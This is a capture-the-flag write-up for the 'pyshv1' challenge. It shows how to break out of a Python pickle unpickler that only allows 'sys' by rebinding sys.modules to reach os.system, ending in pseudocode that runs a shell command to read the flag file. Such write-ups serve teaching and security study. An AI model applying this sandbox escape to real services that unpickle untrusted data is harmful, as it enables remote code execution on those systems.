---
name: pyshv1
category: misc
points: 572
solves: 13
---

{% ignore %}
[Go to rendered GitBook version](https://sasdf.github.io/ctf/)
{% endignore %}


> Continuous delivery is awesome.  
> We deploy our code to production whenever we can.  
> No code, no vulnerability.  
> Everything works great.  


# Overview, Concept and Design Criteria
Intially, I wanted to create some reverse challenge using pickle.
(Yep, one of that strange language series)

However, when I playing with pickle VM,
I realized that it's RIDICULOUSLY POWERFUL.

It shouldn't be limited to some noob `__reduce__` RCE.

Make pickle-pwn great again.


# Solution
## Behavior
In this task, we can send a pickle file to the server.
```python
def login(self):
    user = input().encode('ascii')
    user = codecs.decode(user, 'base64')
    user = pickle.loads(user)
```

The packages that can be imported is limited to `sys` only.
Also, deep import features starting from python3 is blocked.
```python
# See https://docs.python.org/3.7/library/pickle.html#restricting-globals
class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        if module not in whitelist or '.' in name:
            raise KeyError('The pickle is spoilt :(')
        return pickle.Unpickler.find_class(self, module, name)

# ...

pickle.whitelist.append('sys')
```

## Pickle
Pickle is a stack-based VM that is aiming for construct structure.
It has many data manipulation operations.
The only disadvantage is that there's no read operations because you should already know what you constructed.

You can find the pure python implementation of pickle from 
[github](https://github.com/python/cpython/blob/3.6/Lib/pickle.py) 
or `/usr/lib/python3.6/pickle.py`.

Let's see some operations will need in this task.
```
# Import root level attribute
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args

# Call function
REDUCE         = b'R'   # apply callable to argtuple, both on stack

# Set attribute for class
BUILD          = b'b'   # call __setstate__ or __dict__.update()

# Set item in dict
SETITEM        = b's'   # add key+value pair to dict
```

`GLOBAL` (with our own filter) can only import attribute in root level, that is, importing `a.b` is OK, but importing `a.b.c` is disallowed.

## sys module
`sys` has many interesting things inside. One of them is `sys.modules`, which is a cache of imported modules.

Pickle also use `sys.modules`: 
```
def find_class(self, module, name):
    # Subclasses may override this.
    if self.proto < 3 and self.fix_imports:
        # ...
        pass

    __import__(module, level=0)

    # ...

    return getattr(sys.modules[module], name)
```

If we change `sys.modules['sys']` to other things, we can get some attribute of it!!

My exploit looks like:
```python
sys.modules['sys'] = sys.modules

import sys.get as sys.modules.get

os = sys.modules.get('os')

sys.modules['sys'] = os

import sys.system as os.system

os.system('cat ../flag.txt')
```

You can find the final pickle bytecode [here]([_files/solution/solve.py]).
